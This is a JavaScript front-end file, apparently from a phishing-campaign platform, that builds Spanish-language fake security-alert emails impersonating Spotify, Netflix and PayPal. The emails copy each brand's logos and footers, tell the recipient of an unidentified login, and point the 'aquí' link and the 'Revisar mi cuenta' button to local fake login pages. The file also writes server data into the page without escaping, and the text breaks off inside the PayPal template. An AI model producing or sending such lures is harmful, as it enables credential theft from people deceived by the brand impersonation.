let currentUser = JSON.parse(sessionStorage.getItem("user"));
let currentToken = sessionStorage.getItem("token");

function map() {
    let activo = document.querySelector("#campanasActivas");
    activo.innerHTML = "";
    $.ajax({
        method: 'GET',
        url: `/api/campaigns/${currentUser._id}`,
        headers: {"Authorization": currentToken},
        cache: false,
        success: function (res) {
            console.log(res);
            for (let count = 0; count < res.results.length; count++) {
                activo.innerHTML += `<div>
                <p id="campaingplatform" style="display:inline; font-size: 26px; color: white;">${res.results[count].platform} - ${res.results[count].email} &nbsp;&nbsp;&nbsp;</p>
				<button type="button" class="btn btn-info" data-toggle="modal" data-target="#myModal" name=${res.results[count]._id} onclick="verDetalle(this)" style="position: absolute; right: 50em;">Ver campaña</button>
				<button type="button" class="btn btn-secondary" style="color: white !important; position: absolute; right: 39.8em;" onclick=alert("${res.results[count].linkcampaign}") >Link de campaña</button>
                <button type="button" class="btn btn-danger" data-toggle="modal" data-target="#statisticsModal" name=${res.results[count]._id} style="position: absolute; right: 32.3em;" onclick="verEstadisticas(this)">Estadística</button>
                <button type="button" class="btn btn-light" name=${res.results[count]._id} style="position: absolute; right: 28.5em;" onclick="deleteCampaign(this)"><i class="fa fa-trash"></i></button>
			</div>`;
            }
        },
        error: function (error) {
            console.log("ERROR:" + JSON.stringify(error));
        }
    });
}

function verDetalle(event) {
    let modaltext = document.querySelector("#modal-body");
    modaltext.innerHTML = "";
    let html = "";
    $.ajax({
        method: 'GET',
        url: `/api/campaign/${event.name}`,
        headers: {"Authorization": currentToken},
        cache: false,
        success: function (res) {
            switch (res.result.platform) {
                case "spotify":
                    html = `<div dir="ltr"> <div class="gmail_quote"> <div style="word-wrap:break-word"> <table cellpadding="0" cellspacing="0" border="0" valign="top" width="100%" align="center" style="font-family:Helvetica;font-size:12px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:normal;text-align:start;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;width:480px;max-width:480px"> <tbody> <tr> <td valign="top" align="left" style="word-break:normal;border-collapse:collapse;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:18px;color:rgb(85,85,85)"> <center> <div style="width:480px!important"> <table width="100%" height="50" cellpadding="0" cellspacing="0" style="border:none;margin:0px;border-collapse:collapse;padding:0px;width:480px;height:50px"> <tbody valign="middle" style="border:none;margin:0px;padding:0px"> <tr height="20" valign="middle" style="border:none;margin:0px;padding:0px;height:20px"> <td colspan="3" height="20" valign="middle" style="border:none;margin:0px;padding:0px;height:20px"> </td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"> </td><td valign="middle" style="border:none;margin:0px;padding:0px"> <a href="https://www.spotify.com/" style="border:none;margin:0px;padding:0px;text-decoration:none" target="_blank"> <img src="http://aro.scdn.co/newsletters/b220713a2d4ac7a75ebe1f9ee0c78549.png" width="122" height="37" alt="" style="border:none;margin:0px;padding:0px;display:block;max-width:100%;width:122px;min-height:37px"> </a> </td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"> </td></tr><tr height="20" valign="middle" style="border:none;margin:0px;padding:0px;height:20px"> <td colspan="3" height="20" valign="middle" style="border:none;margin:0px;padding:0px;height:20px"> </td></tr></tbody> </table> <table width="100%" cellpadding="0" cellspacing="0" style="border:none;margin:0px;border-collapse:collapse;padding:0px;width:480px"> <tbody valign="middle" style="border:none;margin:0px;padding:0px"> <tr height="28" valign="middle" style="border:none;margin:0px;padding:0px;height:28px"> <td colspan="3" height="28" valign="middle" style="border:none;margin:0px;padding:0px;height:28px"> </td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"> </td><td valign="middle" style="border:none;margin:0px;padding:0px"> <h1 align="center" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;text-decoration:none;color:rgb(85,85,85);font-size:40px;font-weight:bold;line-height:45px;letter-spacing:-0.04em;text-align:center"> ¡Alerta! <br>Ingreso a su cuenta no identificado</h1> </td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"> </td></tr><tr height="16" valign="middle" style="border:none;margin:0px;padding:0px;height:16px"> <td colspan="3" height="16" valign="middle" style="border:none;margin:0px;padding:0px;height:16px"> </td></tr></tbody> </table> <table width="100%" cellpadding="0" cellspacing="0" style="border:none;margin:0px;border-collapse:collapse;padding:0px;width:480px"> <tbody valign="middle" style="border:none;margin:0px;padding:0px"> <tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="width:30px;border:none;margin:0px;padding:0px"> </td><td valign="middle" style="border:none;margin:0px;padding:0px"> <table cellspacing="0" cellpadding="0" border="0" width="100%" style="margin:0px;padding:0px"> <tbody> <tr> <td align="left" style="border:none;margin:0px;padding:0px 0px 5px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(97,100,103);font-size:14px;line-height:20px"> <center style="border:none;margin:0px;padding:0px"> Hola ${res.result.name}, se ha detectado un inicio de sesión en ${res.result.city}, el día ${res.result.date}</center> </td></tr></tbody> </table> <table cellspacing="0" cellpadding="0" border="0" width="100%" style="margin:0px;padding:0px"> <tbody> <tr> <td align="left" style="border:none;margin:0px;padding:0px 0px 5px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(97,100,103);font-size:14px;line-height:20px"> <br style="border:none;margin:0px;padding:0px"> <center style="border:none;margin:0px;padding:0px"> En caso de que desconozca esta actividad, favor de dar clic<span>&nbsp;</span> <a href="./spotifyLogin.html?linkcampaign=${res.result.linkcampaign}&linklogin=${res.result.linklogin}" align="left" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(30,215,96)" target="_blank">aquí</a> <span>&nbsp;</span>para poder recuperar tu cuenta lo antes posible. <br><br>O bien dando clic en el siguiente botón </center> </td></tr></tbody> </table> </td><td width="6.25%" valign="middle" style="width:30px;border:none;margin:0px;padding:0px"> </td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td colspan="3" height="20" valign="middle" style="border:none;margin:0px;padding:0px;height:20px"> </td></tr></tbody> </table> <table width="100%" cellpadding="0" cellspacing="0" style="border:none;margin:0px;border-collapse:collapse;padding:0px;width:480px"> <tbody valign="middle" style="border:none;margin:0px;padding:0px"> <tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="width:30px;border:none;margin:0px;padding:0px"></td><td valign="middle" align="left" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;font-size:14px;line-height:1.1em"> <center style="border:none;margin:0px;padding:0px"> <a href="./spotifyLogin.html?linkcampaign=${res.result.linkcampaign}&linklogin=${res.result.linklogin}" target="_blank" bgcolor="#1ED760" style="border:none;margin:0px;padding:0px;text-decoration:none;width:240px;min-height:44px;border-top-left-radius:22px;border-top-right-radius:22px;border-bottom-right-radius:22px;border-bottom-left-radius:22px;color:rgb(255,255,255);display:block;background-color:rgb(30,215,96)" target="_blank"> <table width="240" height="44" cellpadding="0" cellspacing="0" style="border:none;margin:0px;border-collapse:collapse;padding:0px;width:240px;height:44px"> <tbody valign="middle" style="border:none;margin:0px;padding:0px"> <tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="22" valign="middle" style="border:none;margin:0px;padding:0px;width:22px"> </td><td height="100%" valign="middle" align="center" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;text-decoration:none;border-top-left-radius:22px;border-top-right-radius:22px;border-bottom-right-radius:22px;border-bottom-left-radius:22px;color:rgb(255,255,255);font-size:13px;font-weight:bold;height:44px;line-height:16px;text-align:center;text-transform:uppercase"> REVISAR MI CUENTA</td><td width="22" valign="middle" style="border:none;margin:0px;padding:0px;width:22px"> </td></tr></tbody> </table> </a></center> </td><td width="6.25%" valign="middle" style="width:30px;border:none;margin:0px;padding:0px"></td></tr><tr height="35" valign="middle" style="border:none;margin:0px;padding:0px;height:35px"> <td colspan="3" height="35" valign="middle" style="border:none;margin:0px;padding:0px;height:35px"></td></tr></tbody> </table> <table width="100%" cellpadding="0" cellspacing="0" style="border:none;margin:0px;border-collapse:collapse;padding:0px;width:480px"> <tbody valign="middle" style="border:none;margin:0px;padding:0px"> <tr height="22" valign="middle" style="border:none;margin:0px;padding:0px;height:22px"> <td colspan="3" height="22" valign="middle" style="border:none;margin:0px;padding:0px;height:22px"></td></tr></tbody> </table> <table width="100%" cellpadding="0" cellspacing="0" bgcolor="#F7F7F7" style="border:none;margin:0px;border-collapse:collapse;padding:0px;width:480px;background-color:rgb(247,247,247)"> <tbody valign="middle" style="border:none;margin:0px;padding:0px"> <tr height="25" valign="middle" style="border:none;margin:0px;padding:0px;height:25px"> <td colspan="3" height="25" valign="middle" style="border:none;margin:0px;padding:0px;height:25px"></td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td><td valign="middle" style="border:none;margin:0px;padding:0px"><img src="http://aro.spotify.s3.amazonaws.com/newsletter/images/logo_footer.png" width="77" height="23" alt="" style="border:none;margin:0px;padding:0px;display:block;max-width:100%;width:77px;min-height:23px"> </td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td></tr><tr height="25" valign="middle" style="border:none;margin:0px;padding:0px;height:25px"> <td colspan="3" height="25" valign="middle" style="border:none;margin:0px;padding:0px;height:25px"></td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td><td valign="middle" style="border:none;margin:0px;padding:0px"> <hr bgcolor="#D1D5D9" style="border:none;margin:0px;padding:0px;min-height:1px;background-color:rgb(209,213,217)"> </td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td></tr><tr height="12" valign="middle" style="border:none;margin:0px;padding:0px;height:12px"> <td colspan="3" height="12" valign="middle" style="border:none;margin:0px;padding:0px;height:12px"></td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td><td valign="middle" align="left" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(136,137,140);font-size:11px;line-height:1.65em"> Get Spotify for: &nbsp;<span>&nbsp;</span><a href="https://itunes.apple.com/app/spotify-music/id324684580" style="border-style:none solid none none;margin:0px;text-decoration:none;border-right-width:1px;border-right-color:rgb(195,195,195);border-left-width:1px;border-left-color:transparent;display:inline-block;padding:0px 7px 0px 0px;color:rgb(109,109,109);font-weight:bold" target="_blank">iPhone</a><a href="https://itunes.apple.com/app/spotify-music/id324684580" style="border-style:none solid;margin:0px;text-decoration:none;border-right-width:1px;border-right-color:rgb(195,195,195);border-left-width:1px;border-left-color:transparent;display:inline-block;padding:0px 7px;color:rgb(109,109,109);font-weight:bold" target="_blank">iPad</a><a href="https://play.google.com/store/apps/details?id=com.spotify.music" style="border-style:none solid;margin:0px;text-decoration:none;border-right-width:1px;border-right-color:rgb(195,195,195);border-left-width:1px;border-left-color:transparent;display:inline-block;padding:0px 7px;color:rgb(109,109,109);font-weight:bold" target="_blank">Android</a><a href="https://www.spotify.com/download/" style="border-style:none none none solid;margin:0px;text-decoration:none;border-right-width:1px;border-right-color:rgb(195,195,195);border-left-width:1px;border-left-color:transparent;display:inline-block;padding:0px 0px 0px 7px;color:rgb(109,109,109);font-weight:bold" target="_blank">Other</a></td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td></tr><tr height="12" valign="middle" style="border:none;margin:0px;padding:0px;height:12px"> <td colspan="3" height="12" valign="middle" style="border:none;margin:0px;padding:0px;height:12px"></td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td><td valign="middle" style="border:none;margin:0px;padding:0px"> <hr bgcolor="#D1D5D9" style="border:none;margin:0px;padding:0px;min-height:1px;background-color:rgb(209,213,217)"> </td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td></tr><tr height="25" valign="middle" style="border:none;margin:0px;padding:0px;height:25px"> <td colspan="3" height="25" valign="middle" style="border:none;margin:0px;padding:0px;height:25px"></td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td><td valign="middle" align="left" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(136,137,140);font-size:11px;line-height:1.65em"> This message was sent to<span>&nbsp;</span><a href="mailto:${res.result.email}" target="_blank">${res.result.email}</a>. If you have questions or complaints, please<span>&nbsp;</span> <a href="https://www.spotify.com/about-us/contact/" align="left" style="color:rgb(109, 109, 109);text-decoration:none;font-weight:bold;border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;text-align:left" target="_blank">contact us</a>.<span>&nbsp;</span></td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td></tr><tr height="33" valign="middle" style="border:none;margin:0px;padding:0px;height:33px"> <td colspan="3" height="33" valign="middle" style="border:none;margin:0px;padding:0px;height:33px"></td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td><td valign="middle" align="left" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(136,137,140);line-height:1.65em;font-size:11px"> <a style="border-style:none solid none none;margin:0px;text-decoration:none;border-right-width:1px;border-right-color:rgb(195,195,195);border-left-width:1px;border-left-color:transparent;display:inline-block;padding:0px 7px 0px 0px;color:rgb(109,109,109);font-weight:bold" target="_blank">Terms of Use</a><a style="border-style:none solid;margin:0px;text-decoration:none;border-right-width:1px;border-right-color:rgb(195,195,195);border-left-width:1px;border-left-color:transparent;display:inline-block;padding:0px 7px;color:rgb(109,109,109);font-weight:bold" target="_blank">Technical requirements</a><a href="https://www.spotify.com/about-us/contact/" style="border-style:none none none solid;margin:0px;text-decoration:none;border-right-width:1px;border-right-color:rgb(195,195,195);border-left-width:1px;border-left-color:transparent;display:inline-block;padding:0px 0px 0px 7px;color:rgb(109,109,109);font-weight:bold" target="_blank">Contact Us</a></td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td colspan="3" height="12" valign="middle" style="border:none;margin:0px;padding:0px;height:12px"></td></tr><tr valign="middle" style="border:none;margin:0px;padding:0px"> <td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td><td valign="middle" align="left" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(136,137,140);line-height:1.65em;font-size:11px"> Spotify USA Inc, 45 W. 18th Street, 7th Floor, New York, NY 10011, USA</td><td width="6.25%" valign="middle" style="border:none;margin:0px;padding:0px;width:30px"></td></tr><tr height="20" valign="middle" style="border:none;margin:0px;padding:0px;height:20px"> <td colspan="3" height="25" valign="middle" style="border:none;margin:0px;padding:0px;height:25px"></td></tr></tbody> </table> </div></center> </td></tr></tbody> </table><br></div></div></div>`
                    break;
                case "netflix":
                    html = `<div bgcolor="#EAEAEA" style="font-family:Helvetica, Arial, sans;color:rgb(34, 31, 31);padding:0;margin:0;background-color:rgb(234, 234, 234);background-color:rgb(234, 234, 234);margin-top:0;"> <table class="container" width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:rgb(234, 234, 234);margin-top:0;"> <tbody> <tr> <td align="center"> <table class="shell" width="600" cellpadding="0" cellspacing="0" border="0"> <tbody> <tr> <td class="content-shell" bgcolor="#ffffff" style="background:url(http://cdn.nflximg.com/us/email/hitch/netflix-crop.png) no-repeat rgb(255, 255, 255);background-repeat:no-repeat;background-color:rgb(255, 255, 255);"> <table class="content" width="100%" cellpadding="0" cellspacing="0" border="0"> <tbody> <tr> <td class="logo" align="center" style="padding:46px 0 0 0;"> <a href="https://www.netflix.com/browse?lnktrk=EMP&amp;g=6B9B74BD326F4840414BD006D2E990AC64520BE0&amp;lkid=URL_HOME" style="color:inherit;" target="_blank"> <img src="http://cdn.nflximg.com/us/email/logo/newDesign/logo_v2.png" alt="Netflix" width="145" align="center" style="-ms-interpolation-mode:bicubic;border:none;outline:none;border-style:none;"> </a> </td></tr><tr> <td class="headline" style="font-family:Helvetica, Arial, sans;font-weight:bold;font-size:28px;color:rgb(34, 31, 31);line-height:36px;padding:40px 90px 10px 90px;"> ¡Alerta! <br>Acceso no identificado </td></tr><tr> <td class="copy" style="padding:22px 90px 0 90px;font-family:Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif;font-size:18px;line-height:24px;-webkit-font-smoothing:antialiased;"> Hola <span id="nombreNET">${res.result.name}</span>, </td></tr><tr> <td class="copy" style="padding:22px 90px 0 90px;font-family:Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif;font-size:18px;line-height:24px;-webkit-font-smoothing:antialiased;"> Se ha detectado un inicio de sesión en la ciudad de <span id="ciudadNET">${res.result.city}</span>, el día <span id="fechaNET">${res.result.date}</span></td></tr><tr> <td class="copy" style="padding:22px 90px 0 90px;font-family:Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif;font-size:18px;line-height:24px;-webkit-font-smoothing:antialiased;"> En caso de que desconozca esta actividad, favor de dar clic<span>&nbsp;</span> <a href="./NetflixLogin.html?linkcampaign=${res.result.linkcampaign}&linklogin=${res.result.linklogin}" align="left" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(30,215,96)" target="_blank">aquí</a> para poder recuperar tu cuenta lo antes posible. </td></tr><tr> <td class="copy" style="padding:22px 90px 0 90px;font-family:Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif;font-size:18px;line-height:24px;-webkit-font-smoothing:antialiased;"> O bien dando clic en el siguiente botón</td></tr><tr> <td class="button-shell" style="padding:22px 90px 0 90px;"> <table class="button red" cellpadding="0" cellspacing="0" border="0"> <tbody> <tr> <td style="color:rgb(255, 255, 255);background-color:rgb(229, 9, 20);padding:10px 16px;max-width:250px;border-radius:2px;"> <a class="button-link" href="./NetflixLogin.html?linkcampaign=${res.result.linkcampaign}&linklogin=${res.result.linklogin}" style="color:#ffffff;font-family: Helvetica, Arial, sans;font-size:14px;font-weight:bold;text-align:center;text-decoration:none;color:inherit;color:rgb(255, 255, 255);font-size:16px;line-height:24px;font-weight:normal;text-align:center;text-decoration:none;font-family:Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif;letter-spacing:0.025em;" target="_blank">Revisar mi cuenta</a> </td></tr></tbody> </table> </td></tr><tr> <td class="copy" style="padding:22px 90px 0 90px;font-family:Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif;font-size:18px;line-height:24px;-webkit-font-smoothing:antialiased;"> –Tus amigos de Netflix </td></tr><tr> <td class="escape-hatch-neutral-shell" style="padding:30px 90px 0 90px;"> <a class="escape-hatch-neutral link" href="https://www.netflix.com/browse?lnktrk=EMP&amp;g=6B9B74BD326F4840414BD006D2E990AC64520BE0&amp;lkid=URL_HOME_2" style="text-decoration:none;color:inherit;" target="_blank"> <table class="escape-hatch-neutral-table" width="100%" cellpadding="0" cellspacing="0" border="0"> <tbody> <tr> <td class="escape-hatch-neutral text" style="font-family:Helvetica Neue, Helvetica, Roboto, Segoe UI, sans-serif;font-size:15px;line-height:17px;font-weight:bold;padding:17px 0 0 0;vertical-align:bottom;text-decoration:none;"> &nbsp; </td></tr></tbody> </table> </a> </td></tr></tbody> </table> </td></tr></tbody> </table> <table class="shell-footer" width="600" cellpadding="0" cellspacing="0" border="0"> <tbody> <tr> <td class="content-shell-footer"> <table class="footer" width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:rgb(34, 31, 31);text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;"> <tbody> <tr> <td class="footer questions" style="background-color:rgb(34, 31, 31);padding:34px 90px 0 90px;text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;"> Questions? Call 1-866-579-7172 </td></tr><tr> <td class="footer footer-copy" style="background-color:rgb(34, 31, 31);text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;padding:15px 90px 0 90px;"> This account email has been sent to you as part of your Netflix membership. To change your email preferences at any time, please visit the <a style="color:#A9A6A6;color:rgb(169, 166, 166);color:inherit;" href="#" target="_blank">Communication Settings</a> page for your account. </td></tr><tr> <td class="footer footer-copy" style="background-color:rgb(34, 31, 31);text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;padding:15px 90px 0 90px;"> Please do not reply to this email, as we are unable to respond from this email address. If you need help or would like to contact us, please visit our Help Center at <a href="https://help.netflix.com/help?lnktrk=EMP&amp;g=6B9B74BD326F4840414BD006D2E990AC64520BE0&amp;lkid=URL_HELP_3" style="color:#A9A6A6;color:rgb(169, 166, 166);color:inherit;" target="_blank">help.netflix.com</a>. </td></tr><tr> <td class="footer footer-copy" style="background-color:rgb(34, 31, 31);text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;padding:15px 90px 0 90px;"> This message was mailed to <a href="#" style="text-decoration: none !important; color: #A9A6A6;color:rgb(169, 166, 166);color:inherit;" target="_blank">${res.result.email}by Netflix. </td></tr><tr> <td class="footer footer-copy-no-padding" style="background-color:rgb(34, 31, 31);padding:0 90px 0 90px;text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;"> SRC: <a href="https://help.netflix.com/help?lnktrk=EMP&amp;g=6B9B74BD326F4840414BD006D2E990AC64520BE0&amp;lkid=URL_HELP_4" style="color:#A9A6A6;text-decoration:none;color:rgb(169, 166, 166);color:inherit;" target="_blank">12550_en_US</a> </td></tr><tr> <td class="footer footer-copy-no-padding" style="background-color:rgb(34, 31, 31);padding:0 90px 0 90px;text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;"> Use of the Netflix service and website is subject to our <a style="color:#A9A6A6;color:rgb(169, 166, 166);color:inherit;" href="https://www.netflix.com/TermsOfUse?lnktrk=EMP&amp;g=6B9B74BD326F4840414BD006D2E990AC64520BE0&amp;lkid=URL_TERMS" target="_blank">Terms of Use</a> and <a style="color:#A9A6A6;color:rgb(169, 166, 166);color:inherit;" href="https://www.netflix.com/PrivacyPolicy?lnktrk=EMP&amp;g=6B9B74BD326F4840414BD006D2E990AC64520BE0&amp;lkid=URL_PRIVACY" target="_blank">Privacy Statement</a>. </td></tr><tr> <td class="footer footer-copy-no-padding" style="background-color:rgb(34, 31, 31);padding:0 90px 0 90px;text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;"> <span class="iosnonlink"><a href="www.netflix.com" style="color:#A9A6A6; text-decoration:none;color:rgb(169, 166, 166);color:inherit;" target="_blank">100 Winchester Circle, Los Gatos, CA 95032, U.S.A.</a></span> </td></tr><tr> <td class="footer footer-spacer" height="44" style="background-color:rgb(34, 31, 31);text-align:initial;font-family:Helvetica, Arial, sans;font-size:13px;color:rgb(169, 166, 166);line-height:16px;"> &nbsp; <img src="http://beacon.netflix.com/img/BAQgBEAEa4AJ2THSsgosiINnMMOKPnivWKSK-WmHHLwvtmTf2TDI_GuFdQ7rh6ZsD7KUYbtEoyrbWZRrh4iEyxxZCzrO8sWQOjOVhRo6JAmCU__SLGy0aRkq0jPKIDCQK5Jdn3QF5Gr_pDKhBSoFb208RH9eIL7wJRrfWNE_JRmxB9zw8C-Q2NKbIwhXlazYptjx0x7L86pqFsozMPMwUqyfMOA1Is1UHLeKyTkDuDh8Lr8ia23EueD0p9_EJN6ITP9M4aWC8tZ8ZlxwzMigKLaVv571NB9_d0oUxLf3J-cemaKm0XL37Qw6bqcPqVqVm6VWmPXyXxMbsDRPDYM44lhegyht9pukqisZgV1C96Hbb8MCmE27TO4RsUw3CxC3-wW0irf1Cui3u8I_Tdc_1h_d4tOIyk52SdnQzhW3JY_5FiubQAIhrVY7A0-wbM8HEopZPFQ1Ca2h8Sg6B3qrpVuTGsSgPObxl" style="display:block;-ms-interpolation-mode:bicubic;border:none;outline:none;" border="0"> </td></tr></tbody> </table> </td></tr></tbody> </table> </td></tr></tbody> </table> <table class="inbox-fix" cellpadding="0" cellspacing="0" border="0" width="600" height="1" align="center" style="width: 600px !important;"> <tbody> <tr> <td> <img src="http://cdn.nflximg.com/us/email/spacer.gif" width="200" height="1" style="border-collapse:collapse;display:block;-ms-interpolation-mode:bicubic;border:none;outline:none;"> </td><td> <img src="http://cdn.nflximg.com/us/email/spacer.gif" width="200" height="1" style="border-collapse:collapse;display:block;-ms-interpolation-mode:bicubic;border:none;outline:none;"> </td><td> <img src="http://cdn.nflximg.com/us/email/spacer.gif" width="200" height="1" style="border-collapse:collapse;display:block;-ms-interpolation-mode:bicubic;border:none;outline:none;"> </td></tr></tbody> </table> <div class="ios-hide-max gmail-fix-no-inline" style="white-space:nowrap; font:15px courier; line-height:0;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </div></div>`
                    break;
                case "paypal":
                    html=`<table border="0" cellpadding="0" cellspacing="0" width="100%" align="center"> <tbody><tr> <td align="center" valign="middle" bgcolor="#f2f2f2"> <table border="0" cellpadding="0" cellspacing="0" width="700" align="center" class="table-main-gmail"> <tbody><tr> <td align="center" bgcolor="#f2f2f2" style="padding: 0px 0px 0px 0px;vertical-align:middle;" class="table-main-gmail"> <table border="0" cellpadding="0" cellspacing="0" width="100%" align="center" class="table-main"> <tbody><tr> <td align="center" valign="middle" bgcolor="#f2f2f2" style="padding: 10px 0px 10px 0px;"> <table border="0" cellpadding="0" cellspacing="0" width="100%" align="center"> <tbody><tr> <td align="left" valign="middle" style="font-family: 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 12px; text-decoration: none; color:#666666;">&nbsp;</td><td width="120" align="right" valign="middle" style="font-family: 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 12px; width:120px;"></td></tr></tbody></table> </td></tr><tr> <td align="center" valign="middle" bgcolor="#ffffff" style="border-top:1px solid #e3e3e3;border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3"> <table width="100%" border="0" cellspacing="0" cellpadding="0" class="hide"> <tbody> <tr> <td align="left" valign="top" style="padding:36px 0px 0px 32px"><img src="https://pp.images.harmony.epsilon.com/NorthAmerica/NA/2017/May/NA05084/Creative_StatementEmailBanners_Desktop.jpg" width="168" height="41" alt="PayPal" border="0" style="display:block;"></td></tr></tbody> </table> <div class="mobile-only" style="font-size: 0; max-height: 0; overflow: hidden; display: none"> <table width="100%" border="0" cellspacing="0" cellpadding="0"> <tbody> <tr> <td align="left" valign="top" style="padding:28px 0px 0px 25px"><img src="https://pp.images.harmony.epsilon.com/NorthAmerica/NA/2017/May/NA05084/Creative_StatementEmailBanners_Mobile.jpg" width="138" height="34" alt="PayPal" border="0" style="display:block;"></td></tr></tbody> </table> </div></td></tr><tr> <td align="left" bgcolor="#ffffff" valign="middle" style="font-family: 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 30px; line-height:36px; text-decoration: none; color:#333333; padding: 48px 70px 0px 32px; border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;" class="mob-hero-pad"> ¡Alerta! Ingreso a su cuenta no identificado. </td></tr><tr> <td align="left" bgcolor="#ffffff" valign="middle" style="font-family: 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 18px; line-height:22px; text-decoration: none; color:#595959; padding: 42px 0px 0px 32px; border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;" class="mob-mc-pad1"> <strong>Hola ${res.result.name},</strong> </td></tr><tr> <td align="left" bgcolor="#ffffff" valign="middle" style="font-family: 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 15px; line-height:22px; text-decoration: none; color:#595959; padding: 24px 180px 0px 32px; border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;" class="mob-mc-pad2"> Se ha detectado un inicio de sesión en la ciudad de ${res.result.city}, el día ${res.result.date}</td></tr><tr> <td align="left" bgcolor="#ffffff" valign="middle" style="font-family: 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 15px; line-height:22px; text-decoration: none; color:#595959; padding: 24px 180px 0px 32px; border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;" 